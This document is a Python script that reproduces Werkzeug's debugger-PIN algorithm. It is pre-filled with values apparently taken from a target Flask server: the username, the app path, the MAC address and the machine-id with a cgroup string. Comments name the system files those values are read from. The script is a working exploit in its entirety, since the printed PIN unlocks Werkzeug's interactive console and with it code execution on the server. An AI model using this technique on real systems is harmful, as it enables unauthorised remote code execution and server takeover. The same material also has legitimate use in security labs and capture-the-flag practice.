#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'www-data',# username (/proc/self/environ)
	'flask.app',# modname
	'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'345052358942',# str(uuid.getnode()),  /sys/class/net/eth0/address 
	# Machine Id: /etc/machine-id + /proc/self/cgroup
	'ed5b159560f54721827644bc9b220d00superpass.service'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)